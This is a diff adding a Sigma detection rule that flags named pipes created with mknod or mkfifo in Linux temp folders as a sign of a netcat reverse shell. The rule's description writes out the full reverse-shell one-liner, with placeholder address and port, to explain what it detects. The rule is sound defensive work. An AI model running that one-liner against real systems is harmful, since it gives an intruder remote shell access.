@@ -1,0 +1,33 @@
+title: Named Pipe Created for a Reverse Shell
+id: 84d8a957-2225-4067-b228-a86ced815c61
+status: experimental
+description: |
+    mknod <path> p or mkfifo creates a named pipe. The classic netcat reverse shell
+    "/bin/sh 0</tmp/backpipe | nc <ip> <port> 1>/tmp/backpipe" needs one, so a pipe made in
+    /tmp or /dev/shm is a strong sign. Sigma version of the second half of
+    detections/splunk/D09-linux-uid0-account-or-reverse-shell.spl.
+references:
+    - https://attack.mitre.org/techniques/T1059/004/
+author: Bharathwaj Murali
+date: 2026-11-10
+tags:
+    - attack.execution
+    - attack.t1059.004
+logsource:
+    category: process_creation
+    product: linux
+detection:
+    selection_mknod:
+        Image|endswith: '/mknod'
+        CommandLine|endswith: ' p'
+    selection_mkfifo:
+        Image|endswith: '/mkfifo'
+    temp_location:
+        CommandLine|contains:
+            - '/tmp/'
+            - '/dev/shm/'
+            - '/var/tmp/'
+    condition: 1 of selection_* and temp_location
+falsepositives:
+    - Scripts that use named pipes in temp folders for inter-process communication
+level: high
